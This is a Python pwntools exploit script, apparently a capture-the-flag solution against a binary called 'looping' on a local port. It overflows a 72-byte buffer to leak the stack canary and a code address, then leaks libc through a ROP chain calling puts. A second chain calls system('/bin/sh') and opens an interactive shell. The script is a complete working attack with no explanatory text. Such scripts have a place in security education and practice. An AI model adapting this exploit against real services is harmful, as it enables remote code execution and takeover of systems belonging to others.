
from pwn import *

# r = process('./looping')
r = remote('127.0.0.1', 12345)
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

puts_lib = elf.symbols['puts']

puts_plt = 0x710
puts_got = 0x200fa8
pop_rdi = 0x9f3 #: pop rdi; ret;

p = b'A' * 72

r.sendline(p)
r.recvline()

leak = r.recvline().strip()
CANARY = b'\x00' + leak[:-6]
EFF_BASE = b'\x00' + leak[8:] + b'\x00\x00'

p = b'A' * 72
p += p64(u64(CANARY))
p += b'B' * 8
p += p64((u64(EFF_BASE) & ~0xfff) + pop_rdi)
p += p64((u64(EFF_BASE) & ~0xfff) + puts_got)
p += p64((u64(EFF_BASE) & ~0xfff) + puts_plt)
p += p64((u64(EFF_BASE) & ~0xfff) + 0x88a)


r.sendline(p)

LIBC_BASE = int.from_bytes(r.recv().split()[2], byteorder='little') - puts_lib
ADDR_BINSH = next(elf.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = elf.symbols['system'] + LIBC_BASE

r.sendline('AAAAAA')
r.recvline()

p = b'A' * 72
p += p64(u64(CANARY))
p += b'B' * 8
p += p64((u64(EFF_BASE) & ~0xfff) + pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)
r.interactive()



